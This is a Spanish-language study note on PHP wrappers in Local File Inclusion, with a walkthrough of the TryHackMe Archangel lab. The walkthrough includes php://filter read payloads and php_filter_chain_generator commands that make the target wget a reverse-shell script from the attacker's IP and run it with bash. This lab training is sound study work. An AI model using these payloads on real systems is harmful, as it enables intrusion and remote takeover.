En el contexto del Local File Inclusion (LFI), un "wrapper" se refiere a un esquema o protocolo utilizado en PHP para acceder a diferentes tipos de recursos, como archivos locales. PHP proporciona una funcionalidad llamada "URL wrappers" que permite acceder a recursos a través de diferentes protocolos, similares a cómo se accede a los archivos a través del protocolo "file://" en las URL.

Cuando se realiza una solicitud a una URL que contiene un parámetro vulnerable a LFI, es posible que un atacante intente manipular ese parámetro utilizando un wrapper específico para acceder a archivos locales en el servidor. El uso de diferentes wrappers puede permitir al atacante superar las restricciones de acceso y leer archivos que normalmente no deberían estar disponibles públicamente.

Algunos ejemplos comunes de wrappers utilizados en LFI incluyen:

- `file://`: Accede a archivos locales en el sistema de archivos del servidor.
- `php://`: Accede a streams y recursos de PHP, como `php://input`, `php://filter`, `php://memory`, etc.
- `data://`: Accede a datos en formato base64 o codificados en otros formatos.
- `expect://`: Ejecuta comandos en el servidor utilizando la función `expect` de PHP.

Estos son solo algunos ejemplos de wrappers utilizados en ataques de LFI. Los atacantes pueden intentar utilizar otros wrappers específicos para lograr sus objetivos, dependiendo del contexto y de las configuraciones del servidor.

----------------------------------

# EJEMPLO PRÁCTICO

Para practicar tenemos la máquina [[MAQUINA ARCHANGEL (Fuzzing, Local File Inclusion con wrappers, log poissoning y manipulación del PATH)]] de tryhackme:

Por lo que lo añadimos en el /etc/hosts, accedemos a http://mafialive.thm y nos encontramos con la primera flag:
![[Pasted image 20240612233916.png]]

Ahora debemos buscar alguna página en mantenimiento dentro de esta, por lo que podemos hacer fuzzing con gobuster buscando extensiones de archivos, por ejemplo de php:
![[Pasted image 20240612233922.png]]

Accedemos a este /test.php:
![[Pasted image 20240612233929.png]]

Y nos encontramos con un local file inclusion donde el parámetro view parece ser vulnerable:
![[Pasted image 20240612233933.png]]

Si intentamos hacer un local file inclusion vemos que no tenemos permisos, por lo que hay algo que nos lo impide:

Por tanto tenemos que recurrir a los wrapper [[Wrapper - Ejecución Remota de Comandos en LFI]] en este repositorio de payloads all the things:
```bash
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md
```

![[Pasted image 20240612233953.png]]
Y aquí tenemos unas instrucciones, por ejemplo con el wrapper filter:
![[Pasted image 20240612234000.png]]

Por tanto este es el wrapper del ejemplo:
```python
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
```
Y este sería el wrapper en nuestra url basándonos en el del ejemplo:
```python
http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
```
Y nos devuelve un texto codificado en base64:
```bash
http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
```
![[Pasted image 20240612234040.png]]
El texto es este:
```bash
 CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E+PGJyPgogICAgICAgIDw/cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg== 
```

Por lo que podemos decodificarlo en base64 y obtenemos la siguiente flag:
![[Pasted image 20240612234056.png]]

Existe una tool llamada php_filet_chain_generator que nos permite ejecutar un comando a partir de un LFI conocido, la cual podemos encontrarla en el siguiente repositorio de github:
```
https://github.com/synacktiv/php_filter_chain_generator
```
Y aquí tenemos sus instrucciones de uso:
![[Pasted image 20240612234105.png]]

Lo ejecutamos pero en la parte del php le metemos un comando, por ejemplo el comando ls -l:
```bash
python3 php_filter_chain_generator.py --chain "<?php system('ls -l'); ?>"
```

![[Pasted image 20240612234114.png]]

Pegamos todo esto a partir del php?in= y vemos que se ejecuta el comando:
![[Pasted image 20240612234126.png]]

En este punto lo que haremos será compartir la reverse shell dentro de un index.html desde python, y dentro del payload tenemos que usar wget primero para descargarlo:

![[Pasted image 20240612234130.png]]

```bash
python3 php_filter_chain_generator.py --chain "<?php system('wget 192.168.0.24'); ?>"
```

![[Pasted image 20240612234142.png]]

Y si lanzamos un ls, ahora el archivo está dentro de la máquina, por lo que ejecutamos el siguiente otro payload para ejecutar dicho archivo:
![[Pasted image 20240612234151.png]]

Por tanto ahora ya podemos ejecutar este archivo y obtener la reverse shell:
```bash
python3 php_filter_chain_generator.py --chain "<?php system('bash index.html.3'); ?>"
```

![[Pasted image 20240612234200.png]]

![[Pasted image 20240612234212.png]]

Y habremos recibido la conexión:

![[Pasted image 20240612234216.png]]
